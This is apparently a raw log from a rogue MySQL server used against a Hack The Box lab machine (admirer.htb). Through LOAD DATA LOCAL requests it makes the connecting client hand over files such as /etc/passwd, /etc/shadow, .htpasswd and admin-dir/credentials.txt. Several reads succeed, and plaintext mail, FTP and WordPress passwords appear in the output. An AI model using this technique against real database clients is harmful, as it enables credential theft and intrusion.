+2020-06-20 23:59:06,023:INFO:Result: '\x02'
+2020-06-20 23:59:06,023:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:59:06,023:INFO:Last packet
+2020-06-20 23:59:06,070:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:59:06,070:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-20 23:59:06,070:INFO:Query
+2020-06-20 23:59:06,070:DEBUG:Pushed: '\x13\x00\x00\x01\xfb../credentials.txt'
+2020-06-20 23:59:06,117:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:59:06,117:DEBUG:Data recved: '\x02'
+2020-06-20 23:59:06,118:INFO:-- result
+2020-06-20 23:59:06,118:INFO:Result: '\x02'
+2020-06-20 23:59:06,118:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:59:06,118:INFO:Last packet
+2020-06-20 23:59:06,164:DEBUG:Data recved: '.\x00\x00'
+2020-06-20 23:59:06,164:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-20 23:59:06,164:INFO:Query
+2020-06-20 23:59:06,164:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb../htaccess'
+2020-06-20 23:59:06,210:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:59:06,210:DEBUG:Data recved: '\x02'
+2020-06-20 23:59:06,210:INFO:-- result
+2020-06-20 23:59:06,210:INFO:Result: '\x02'
+2020-06-20 23:59:06,210:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:59:06,210:INFO:Last packet
+2020-06-20 23:59:06,256:DEBUG:Data recved: '\x17\x00\x00'
+2020-06-20 23:59:06,256:DEBUG:Data recved: '\x00\x03SELECT CONNECTION_ID()'
+2020-06-20 23:59:06,256:INFO:Query
+2020-06-20 23:59:06,256:DEBUG:Pushed: '\x07\x00\x00\x01\xfb../hta'
+2020-06-20 23:59:06,303:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:59:06,303:DEBUG:Data recved: '\x02'
+2020-06-20 23:59:06,303:INFO:-- result
+2020-06-20 23:59:06,303:INFO:Result: '\x02'
+2020-06-20 23:59:06,303:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:59:06,303:INFO:Last packet
+2020-06-20 23:59:06,350:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-20 23:59:06,350:DEBUG:Data recved: '\x00\x03SHOW DATABASES'
+2020-06-20 23:59:06,350:INFO:Query
+2020-06-20 23:59:06,351:DEBUG:Pushed: '\x07\x00\x00\x01\xfb../hta'
+2020-06-20 23:59:06,397:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-20 23:59:06,397:DEBUG:Data recved: '\x02'
+2020-06-20 23:59:06,397:INFO:-- result
+2020-06-20 23:59:06,397:INFO:Result: '\x02'
+2020-06-20 23:59:06,397:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-20 23:59:06,397:INFO:Last packet
+2020-06-20 23:59:06,446:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:59:06,447:DEBUG:Data recved: '\x00\x01'
+2020-06-20 23:59:06,447:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-20 23:59:06,447:DEBUG:Data recved: '\x00\x01'
+2020-06-21 00:00:38,443:INFO:Conn from: ('10.10.10.187', 43218)
+2020-06-21 00:00:38,443:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-21 00:00:38,489:DEBUG:Data recved: '9\x00\x00'
+2020-06-21 00:00:38,489:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-21 00:00:38,489:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:00:38,489:INFO:Last packet
+2020-06-21 00:00:38,535:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:00:38,536:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-21 00:00:38,536:INFO:Query
+2020-06-21 00:00:38,536:DEBUG:Pushed: '\r\x00\x00\x01\xfb../.htpasswd'
+2020-06-21 00:00:38,582:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:00:38,582:DEBUG:Data recved: '\x02'
+2020-06-21 00:00:38,582:INFO:-- result
+2020-06-21 00:00:38,582:INFO:Result: '\x02'
+2020-06-21 00:00:38,582:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:00:38,582:INFO:Last packet
+2020-06-21 00:00:38,638:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:00:38,638:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-21 00:00:38,638:INFO:Query
+2020-06-21 00:00:38,638:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-21 00:00:38,687:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:00:38,687:DEBUG:Data recved: '\x02'
+2020-06-21 00:00:38,687:INFO:-- result
+2020-06-21 00:00:38,687:INFO:Result: '\x02'
+2020-06-21 00:00:38,687:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:00:38,687:INFO:Last packet
+2020-06-21 00:00:38,736:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:00:38,737:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-21 00:00:38,737:INFO:Query
+2020-06-21 00:00:38,737:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-21 00:00:38,787:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:00:38,787:DEBUG:Data recved: '\x02'
+2020-06-21 00:00:38,787:INFO:-- result
+2020-06-21 00:00:38,787:INFO:Result: '\x02'
+2020-06-21 00:00:38,787:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:00:38,787:INFO:Last packet
+2020-06-21 00:00:38,835:DEBUG:Data recved: '.\x00\x00'
+2020-06-21 00:00:38,835:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-21 00:00:38,835:INFO:Query
+2020-06-21 00:00:38,835:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-21 00:00:38,904:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:00:38,904:DEBUG:Data recved: '\x02'
+2020-06-21 00:00:38,905:INFO:-- result
+2020-06-21 00:00:38,905:INFO:Result: '\x02'
+2020-06-21 00:00:38,905:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:00:38,905:INFO:Last packet
+2020-06-21 00:00:38,954:DEBUG:Data recved: '\x0e\x00\x00'
+2020-06-21 00:00:38,954:DEBUG:Data recved: '\x00\x03SELECT USER()'
+2020-06-21 00:00:38,954:INFO:Query
+2020-06-21 00:00:38,955:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-21 00:00:39,024:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:00:39,024:DEBUG:Data recved: '\x02'
+2020-06-21 00:00:39,025:INFO:-- result
+2020-06-21 00:00:39,025:INFO:Result: '\x02'
+2020-06-21 00:00:39,025:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:00:39,025:INFO:Last packet
+2020-06-21 00:00:39,120:INFO:Conn from: ('10.10.10.187', 43220)
+2020-06-21 00:00:39,120:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-21 00:00:39,166:DEBUG:Data recved: '9\x00\x00'
+2020-06-21 00:00:39,167:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-21 00:00:39,167:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:00:39,167:INFO:Last packet
+2020-06-21 00:00:39,214:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:00:39,215:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-21 00:00:39,215:INFO:Query
+2020-06-21 00:00:39,215:DEBUG:Pushed: '\x07\x00\x00\x01\xfb../hta'
+2020-06-21 00:00:39,262:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:00:39,262:DEBUG:Data recved: '\x02'
+2020-06-21 00:00:39,262:INFO:-- result
+2020-06-21 00:00:39,263:INFO:Result: '\x02'
+2020-06-21 00:00:39,263:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:00:39,263:INFO:Last packet
+2020-06-21 00:00:39,309:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:00:39,309:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-21 00:00:39,309:INFO:Query
+2020-06-21 00:00:39,309:DEBUG:Pushed: '\r\x00\x00\x01\xfb../.htpasswd'
+2020-06-21 00:00:39,381:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:00:39,382:DEBUG:Data recved: '\x02'
+2020-06-21 00:00:39,382:INFO:-- result
+2020-06-21 00:00:39,382:INFO:Result: '\x02'
+2020-06-21 00:00:39,382:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:00:39,382:INFO:Last packet
+2020-06-21 00:00:39,429:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:00:39,429:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-21 00:00:39,429:INFO:Query
+2020-06-21 00:00:39,429:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-21 00:00:39,477:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:00:39,477:DEBUG:Data recved: '\x02'
+2020-06-21 00:00:39,477:INFO:-- result
+2020-06-21 00:00:39,477:INFO:Result: '\x02'
+2020-06-21 00:00:39,478:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:00:39,478:INFO:Last packet
+2020-06-21 00:00:39,524:DEBUG:Data recved: '.\x00\x00'
+2020-06-21 00:00:39,524:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-21 00:00:39,524:INFO:Query
+2020-06-21 00:00:39,524:DEBUG:Pushed: '\x0e\x00\x00\x01\xfb../robots.txt'
+2020-06-21 00:00:39,570:DEBUG:Data recved: '\x8a\x00\x00'
+2020-06-21 00:00:39,571:DEBUG:Data recved: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-21 00:00:39,571:INFO:-- result
+2020-06-21 00:00:39,571:INFO:Result: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-21 00:00:39,571:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:00:39,571:DEBUG:Data recved: '\x03'
+2020-06-21 00:00:39,571:INFO:-- result
+2020-06-21 00:00:39,571:INFO:Result: '\x03'
+2020-06-21 00:00:39,571:DEBUG:Pushed: '\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:00:39,571:INFO:Last packet
+2020-06-21 00:00:39,620:DEBUG:Data recved: '\x17\x00\x00'
+2020-06-21 00:00:39,621:DEBUG:Data recved: '\x00\x03SELECT CONNECTION_ID()'
+2020-06-21 00:00:39,621:INFO:Query
+2020-06-21 00:00:39,621:DEBUG:Pushed: '\x0e\x00\x00\x01\xfb../robots.txt'
+2020-06-21 00:00:39,668:DEBUG:Data recved: '\x8a\x00\x00'
+2020-06-21 00:00:39,668:DEBUG:Data recved: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-21 00:00:39,668:INFO:-- result
+2020-06-21 00:00:39,668:INFO:Result: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-21 00:00:39,668:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:00:39,668:DEBUG:Data recved: '\x03'
+2020-06-21 00:00:39,668:INFO:-- result
+2020-06-21 00:00:39,668:INFO:Result: '\x03'
+2020-06-21 00:00:39,668:DEBUG:Pushed: '\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:00:39,668:INFO:Last packet
+2020-06-21 00:00:39,715:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-21 00:00:39,715:DEBUG:Data recved: '\x00\x01'
+2020-06-21 00:00:39,715:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-21 00:00:39,715:DEBUG:Data recved: '\x00\x01'
+2020-06-21 00:04:59,457:INFO:Conn from: ('10.10.10.187', 43222)
+2020-06-21 00:04:59,457:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-21 00:04:59,505:DEBUG:Data recved: '9\x00\x00'
+2020-06-21 00:04:59,505:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-21 00:04:59,505:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:04:59,506:INFO:Last packet
+2020-06-21 00:04:59,551:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:04:59,551:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-21 00:04:59,551:INFO:Query
+2020-06-21 00:04:59,552:DEBUG:Pushed: '\x1d\x00\x00\x01\xfb../admin-dir/credentials.txt'
+2020-06-21 00:04:59,598:DEBUG:Data recved: '\x88\x00\x00'
+2020-06-21 00:04:59,598:DEBUG:Data recved: '\x02[Internal mail account]\nw.cooper@admirer.htb\nfgJr6q#S\\W:$P\n\n[FTP account]\nftpuser\n%n?4Wz}R$tTF7\n\n[Wordpress account]\nadmin\nw0rdpr3ss01!\n'
+2020-06-21 00:04:59,598:INFO:-- result
+2020-06-21 00:04:59,598:INFO:Result: '\x02[Internal mail account]\nw.cooper@admirer.htb\nfgJr6q#S\\W:$P\n\n[FTP account]\nftpuser\n%n?4Wz}R$tTF7\n\n[Wordpress account]\nadmin\nw0rdpr3ss01!\n'
+2020-06-21 00:04:59,598:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:04:59,598:DEBUG:Data recved: '\x03'
+2020-06-21 00:04:59,598:INFO:-- result
+2020-06-21 00:04:59,598:INFO:Result: '\x03'
+2020-06-21 00:04:59,599:DEBUG:Pushed: '\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:04:59,599:INFO:Last packet
+2020-06-21 00:04:59,645:DEBUG:Data recved: '.\x00\x00'
+2020-06-21 00:04:59,646:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-21 00:04:59,646:INFO:Query
+2020-06-21 00:04:59,646:DEBUG:Pushed: '\r\x00\x00\x01\xfb../local.xml'
+2020-06-21 00:04:59,692:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:04:59,692:DEBUG:Data recved: '\x02'
+2020-06-21 00:04:59,693:INFO:-- result
+2020-06-21 00:04:59,693:INFO:Result: '\x02'
+2020-06-21 00:04:59,693:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:04:59,693:INFO:Last packet
+2020-06-21 00:04:59,739:DEBUG:Data recved: '\x0e\x00\x00'
+2020-06-21 00:04:59,739:DEBUG:Data recved: '\x00\x03SELECT USER()'
+2020-06-21 00:04:59,739:INFO:Query
+2020-06-21 00:04:59,740:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb../htaccess'
+2020-06-21 00:04:59,786:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:04:59,786:DEBUG:Data recved: '\x02'
+2020-06-21 00:04:59,786:INFO:-- result
+2020-06-21 00:04:59,786:INFO:Result: '\x02'
+2020-06-21 00:04:59,787:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:04:59,787:INFO:Last packet
+2020-06-21 00:04:59,880:INFO:Conn from: ('10.10.10.187', 43224)
+2020-06-21 00:04:59,880:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-21 00:04:59,929:DEBUG:Data recved: '9\x00\x00'
+2020-06-21 00:04:59,930:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-21 00:04:59,930:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:04:59,930:INFO:Last packet
+2020-06-21 00:04:59,976:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:04:59,976:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-21 00:04:59,977:INFO:Query
+2020-06-21 00:04:59,977:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/passwd'
+2020-06-21 00:05:00,026:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:05:00,026:DEBUG:Data recved: '\x02'
+2020-06-21 00:05:00,027:INFO:-- result
+2020-06-21 00:05:00,027:INFO:Result: '\x02'
+2020-06-21 00:05:00,027:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:05:00,027:INFO:Last packet
+2020-06-21 00:05:00,074:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:05:00,074:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-21 00:05:00,074:INFO:Query
+2020-06-21 00:05:00,074:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-21 00:05:00,122:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:05:00,122:DEBUG:Data recved: '\x02'
+2020-06-21 00:05:00,122:INFO:-- result
+2020-06-21 00:05:00,122:INFO:Result: '\x02'
+2020-06-21 00:05:00,122:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:05:00,122:INFO:Last packet
+2020-06-21 00:05:00,183:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:05:00,184:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-21 00:05:00,184:INFO:Query
+2020-06-21 00:05:00,184:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb../htaccess'
+2020-06-21 00:05:00,231:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:05:00,232:DEBUG:Data recved: '\x02'
+2020-06-21 00:05:00,232:INFO:-- result
+2020-06-21 00:05:00,232:INFO:Result: '\x02'
+2020-06-21 00:05:00,232:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:05:00,232:INFO:Last packet
+2020-06-21 00:05:00,304:DEBUG:Data recved: '.\x00\x00'
+2020-06-21 00:05:00,304:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-21 00:05:00,304:INFO:Query
+2020-06-21 00:05:00,304:DEBUG:Pushed: '\x0e\x00\x00\x01\xfb../robots.txt'
+2020-06-21 00:05:00,356:DEBUG:Data recved: '\x8a\x00\x00'
+2020-06-21 00:05:00,356:DEBUG:Data recved: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-21 00:05:00,356:INFO:-- result
+2020-06-21 00:05:00,356:INFO:Result: '\x02User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n'
+2020-06-21 00:05:00,356:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:05:00,356:DEBUG:Data recved: '\x03'
+2020-06-21 00:05:00,356:INFO:-- result
+2020-06-21 00:05:00,356:INFO:Result: '\x03'
+2020-06-21 00:05:00,357:DEBUG:Pushed: '\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:05:00,357:INFO:Last packet
+2020-06-21 00:05:00,423:DEBUG:Data recved: '\x17\x00\x00'
+2020-06-21 00:05:00,423:DEBUG:Data recved: '\x00\x03SELECT CONNECTION_ID()'
+2020-06-21 00:05:00,423:INFO:Query
+2020-06-21 00:05:00,423:DEBUG:Pushed: '\r\x00\x00\x01\xfb../.htpasswd'
+2020-06-21 00:05:00,470:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:05:00,470:DEBUG:Data recved: '\x02'
+2020-06-21 00:05:00,470:INFO:-- result
+2020-06-21 00:05:00,471:INFO:Result: '\x02'
+2020-06-21 00:05:00,471:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:05:00,471:INFO:Last packet
+2020-06-21 00:05:00,522:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:05:00,522:DEBUG:Data recved: '\x00\x03SHOW DATABASES'
+2020-06-21 00:05:00,522:INFO:Query
+2020-06-21 00:05:00,522:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb/etc/shadow'
+2020-06-21 00:05:00,569:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:05:00,569:DEBUG:Data recved: '\x02'
+2020-06-21 00:05:00,569:INFO:-- result
+2020-06-21 00:05:00,569:INFO:Result: '\x02'
+2020-06-21 00:05:00,570:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:05:00,570:INFO:Last packet
+2020-06-21 00:05:00,619:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-21 00:05:00,619:DEBUG:Data recved: '\x00\x01'
+2020-06-21 00:05:00,620:DEBUG:Data recved: '\x01\x00\x00'
+2020-06-21 00:05:00,620:DEBUG:Data recved: '\x00\x01'
+2020-06-21 00:13:16,191:INFO:Conn from: ('10.10.10.187', 54556)
+2020-06-21 00:13:16,192:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-21 00:13:16,239:DEBUG:Data recved: '9\x00\x00'
+2020-06-21 00:13:16,239:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-21 00:13:16,239:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:13:16,239:INFO:Last packet
+2020-06-21 00:13:16,287:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:13:16,287:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-21 00:13:16,287:INFO:Query
+2020-06-21 00:13:16,287:DEBUG:Pushed: '\x1d\x00\x00\x01\xfb../admin-dir/credentials.txt'
+2020-06-21 00:13:16,333:DEBUG:Data recved: '\x88\x00\x00'
+2020-06-21 00:13:16,333:DEBUG:Data recved: '\x02[Internal mail account]\nw.cooper@admirer.htb\nfgJr6q#S\\W:$P\n\n[FTP account]\nftpuser\n%n?4Wz}R$tTF7\n\n[Wordpress account]\nadmin\nw0rdpr3ss01!\n'
+2020-06-21 00:13:16,333:INFO:-- result
+2020-06-21 00:13:16,333:INFO:Result: '\x02[Internal mail account]\nw.cooper@admirer.htb\nfgJr6q#S\\W:$P\n\n[FTP account]\nftpuser\n%n?4Wz}R$tTF7\n\n[Wordpress account]\nadmin\nw0rdpr3ss01!\n'
+2020-06-21 00:13:16,333:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:13:16,333:DEBUG:Data recved: '\x03'
+2020-06-21 00:13:16,333:INFO:-- result
+2020-06-21 00:13:16,333:INFO:Result: '\x03'
+2020-06-21 00:13:16,333:DEBUG:Pushed: '\x07\x00\x00\x04\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:13:16,333:INFO:Last packet
+2020-06-21 00:13:16,380:DEBUG:Data recved: '.\x00\x00'
+2020-06-21 00:13:16,380:DEBUG:Data recved: '\x00\x03SET sql_quote_show_create = 1, autocommit = 1'
+2020-06-21 00:13:16,381:INFO:Query
+2020-06-21 00:13:16,381:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb../htaccess'
+2020-06-21 00:13:16,427:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:13:16,427:DEBUG:Data recved: '\x02'
+2020-06-21 00:13:16,427:INFO:-- result
+2020-06-21 00:13:16,427:INFO:Result: '\x02'
+2020-06-21 00:13:16,427:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:13:16,428:INFO:Last packet
+2020-06-21 00:13:16,475:DEBUG:Data recved: '\x0e\x00\x00'
+2020-06-21 00:13:16,475:DEBUG:Data recved: '\x00\x03SELECT USER()'
+2020-06-21 00:13:16,475:INFO:Query
+2020-06-21 00:13:16,475:DEBUG:Pushed: '\x0c\x00\x00\x01\xfb../htaccess'
+2020-06-21 00:13:16,521:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:13:16,521:DEBUG:Data recved: '\x02'
+2020-06-21 00:13:16,521:INFO:-- result
+2020-06-21 00:13:16,521:INFO:Result: '\x02'
+2020-06-21 00:13:16,521:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:13:16,521:INFO:Last packet
+2020-06-21 00:13:16,613:INFO:Conn from: ('10.10.10.187', 54558)
+2020-06-21 00:13:16,614:DEBUG:Pushed: 'A\x00\x00\x00\n3.0.0-Evil_Mysql_Server\x006\x00\x00\x00evilsalt\x00\xdf\xf7\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00evil2222\x00'
+2020-06-21 00:13:16,662:DEBUG:Data recved: '9\x00\x00'
+2020-06-21 00:13:16,662:DEBUG:Data recved: '\x01\x8d\xa2\n\x00\x00\x00\x00\xc0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00mysql_native_password\x00'
+2020-06-21 00:13:16,662:DEBUG:Pushed: '\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:13:16,663:INFO:Last packet
+2020-06-21 00:13:16,708:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:13:16,709:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-21 00:13:16,709:INFO:Query
+2020-06-21 00:13:16,709:DEBUG:Pushed: '\x07\x00\x00\x01\xfb../hta'
+2020-06-21 00:13:16,768:DEBUG:Data recved: '\x00\x00\x00'
+2020-06-21 00:13:16,768:DEBUG:Data recved: '\x02'
+2020-06-21 00:13:16,769:INFO:-- result
+2020-06-21 00:13:16,769:INFO:Result: '\x02'
+2020-06-21 00:13:16,769:DEBUG:Pushed: '\x07\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00'
+2020-06-21 00:13:16,769:INFO:Last packet
+2020-06-21 00:13:16,934:DEBUG:Data recved: '\x0f\x00\x00'
+2020-06-21 00:13:16,935:DEBUG:Data recved: '\x00\x03SET NAMES utf8'
+2020-06-21 00:13:16,935:INFO:Query
